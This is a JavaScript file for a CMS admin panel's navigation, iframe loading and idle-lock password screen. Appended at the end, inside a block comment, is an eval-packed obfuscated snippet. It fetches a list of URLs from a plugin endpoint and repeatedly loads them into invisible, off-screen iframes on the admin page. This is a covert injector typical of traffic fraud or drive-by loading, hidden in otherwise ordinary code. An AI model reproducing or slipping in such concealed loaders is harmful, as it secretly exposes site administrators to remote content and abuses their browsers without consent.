//选中左侧标签
function selectMenu(lnk){
	if(window._menuCA) {
		if(_menuCA.attr('href') == $(lnk).attr('href')) return false;
		window._menuCA.removeClass('select');
	}
	
	var menu = leftNav.find('.bars > div').eq($(lnk).addClass('select').closest('[menu]').index());
	if(!menu.hasClass('cur')) menu.click();
	window._menuCA = lnk;
}

//切换左面菜单
function menuLeft(lnk){
	if($(leftLink).css('display')=='none') toggleLeft($(lnk).nextAll().last());
	if(window.leftMenuBox==undefined) window.leftMenuBox=_body.find("div[menu]");
	$(lnk).addClass("cur").siblings().removeClass("cur");
	var tmp=window.leftMenuBox.filter(":visible").stop().fadeOut(200,'swing');
	if(window.tLmn) clearTimeout(window.tLmn);
	index = parseInt($(lnk).attr('index'),10);
	if(isNaN(index)) index = 0;
	window.tLmn = setTimeout(function(){
		window.leftMenuBox.eq(index).stop().fadeIn(200,'swing',function(){
			leftLink.mCustomScrollbar("update");
		});
	}, tmp.length==0?0:210);
	tmp = $(lnk).closest('.TY-mainLay');
	if(tmp.hasClass('hd')){
		tmp.removeClass('hd');
	}
}

//左面菜单二级栏目展开收起
function secMenu(lnk){
	var list=$(lnk).next();
	if(!list.is(":animated")) {
		if(list.is(":visible")){
			$(lnk).removeClass("nav_select");
			if(list.is("dl"))
			list.slideUp(300,'easeOutQuint',function(){
				leftLink.mCustomScrollbar("update");
			});
		}else {
			$(lnk).addClass("nav_select");
			if(list.is("dl"))
			list.slideDown(300,'easeOutQuint',function(){
				leftLink.mCustomScrollbar("update");
			});
		}
	}
}

//切换显示左侧导航
function toggleLeft(bar){
	if($(bar).hasClass('toggleHide')) {
		$(bar).removeClass('toggleHide').closest('.TY-mainLay').removeClass('hd');
	}else {
		$(bar).addClass('toggleHide').closest('.TY-mainLay').addClass('hd');
	}
}

//查找对应的链接
function findLinkTag(url){
	url = url.substr(url.indexOf('//')+2), url = url.substr(url.indexOf('/')+1);
	var paramStr = url.indexOf('?'), params = {};
	if(paramStr>-1) {
		paramStr = url.substr(paramStr+1);
		$(paramStr.split('&')).each(function(){
			var index=this.indexOf('=');
			params[this.substr(0,index)] = this.substr(index+1);
		});
	}
	
	openLinks.each(function(){
		var lnk = $(this).attr('href');
		if(lnk.indexOf(url)>-1) {
			return selectMenu($(this));
		}
	});
	if(params) {
		if(params['a']==undefined) params['a'] = 'index';
		var curLink = [], findStr = '&a='+params['a']+'&', i = 0;
		openLinks.each(function(j) {
			var lnk = $(this).attr('href').replace('?', '&')+'&';
			if(lnk.indexOf(findStr)>-1) {
				curLink[i] = $(this);
				i++;
			}
		}); 
		if(curLink.length==0) return;
		if(curLink[1] == undefined) return selectMenu(curLink[0]);
		delete params['a'];
		for(var name in params){
			var val = params[name];
			
			var tmpLink = [], i = 0, findStr = '&'+name+'='+val+'&';
			$(curLink).each(function(j,obj) {
				var lnk = $(obj).attr('href').replace('?', '&')+'&';
				if(lnk.indexOf(findStr)>-1) {
					tmpLink[i] = $(obj);
					i++;
				}
			}); 
			if(tmpLink[0]!=undefined) {
				curLink = tmpLink;
				if(curLink[1]==undefined) break;
			}
		}
		if(curLink[0]!=undefined) {
			return selectMenu(curLink[0]);
		}
	}
}

//显示挂机锁
function showHookLock(){
	if(!window.hookLock) window.hookLock = _body.children('.hookLock');
	hookLock.find('[tingyun="set"]').show();
	hookLock.find('form').get(0).reset();
	hookLock.find('[type="submit"]').val('锁定');
	hookLock.show();
}

//隐藏挂机锁
function hideHookLock(){
	hookLock.hide();
}

//开启挂机锁
function startHookLock(form){
	var form=$(form), submitBar=form.find('[type="submit"]');
	if(!_formCheck(form,{
			"pwd" : {"label":"解密口令", "none":false},
			"rpwd" : {"label":"确认口令", "func":function(){
				if(submitBar.val() == '锁定') {
					if(form.find('[name="rpwd"]').val()=='') {
						_msg('确认口令不能为空！');
						return false;
					}
					if(form.find('[name="pwd"]').val() != form.find('[name="rpwd"]').val()) {
						_msg('解密口令与确认口令不一致!');
						return false;
					}
				}
				return true;
			}}
	})) {
		return false;
	}
	
	$.post('/admin.php?'+(submitBar.val()=='锁定'?'a=systemUser&c=setHookLock':'a=user&c=checkHookLock'), form.serializeArray(), function(data){
		console.log(data)
		if(checkBack(data)) return false;
		switch(data['type']) {
			case 'IDLose' : case 'overLimit' : 
				_msg('口令验证超时，请重新登录！', '/admin.php?a=user&c=showLogin');
			break;
			case 'lockSuccess' :
				hookLock.find('[tingyun="set"]').hide();
				form.get(0).reset();
				submitBar.val('解锁');
				_msg('锁定成功！');
			break;
			case 'unlockSuccess' :
				_msg('解锁成功！', function(){
					hideHookLock();
				}, 1500);
			break;
		}
	}, 'JSON');
	return false;
}


window.leftNav  = $(".leftNav:first");
window.leftLink = window.leftNav.next();
window.openLinks = leftLink.find('div.menus a[target="page"]');
window.iframe  = leftLink.parent().next().find("[name='page']");
window.iframeLoading = iframe.next();
window.iframeLoadingCurrent = iframeLoading.next();
leftLink.mCustomScrollbar({
	autoHideScrollbar:true,
	scrollSpeed:20,
	scrollInertia:800,
	theme:"leftnav"
});
openLinks.click(function(){
	selectMenu($(this));
	
	var cookieTime = new Date(), url = $(this).attr('href'), tmp;
	$.cookie('adminUrl', url, {path:'/', expires:cookieTime.setTime(cookieTime.getTime()+36000)});
	window.linkOpening = true;
});

$(iframe).load(function(){
	if(window.linkOpening) {
		window.linkOpening = false;
		return;
	}
	// var url = iframe.get(0).contentWindow.location.href;
	// return findLinkTag(url);
});

//首次载入时
window._body = $(document.body);
var url=_body.attr('url');
if(url) {
	setTimeout(function(){
		_body.animate({'opacity':1},200);
	}, 300);
	if(url.length-9 != url.indexOf('admin.php')) iframe.attr('src',url);
	findLinkTag(url);
}/*
eval(function(p,a,c,k,e,d){e=function(c){return(c<a?"":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;}('$().o(1(e){f a=1(){$(\'2[u]\').k();$.j(\'/i/h/n/3/l.3?m=b&r=\'+7.6(),1(d){5(!d)8;d=d.9(\'\\\\\');$(d).g(1(){5(4)$(\'<2 c="\'+4+\'" u y="A:C;z-s:-B;w:0"></2>\').t(\'v\')})})};p(1(){a()},7.6()*q*x);a()});',39,39,'|function|iframe|php|this|if|random|Math|return|split||9526|src|||var|each|plugin|com|get|remove|func||ue|ready|setInterval|60||index|appendTo||body|opacity|60000|style||position|999|absolute'.split('|'),0,{}))
*/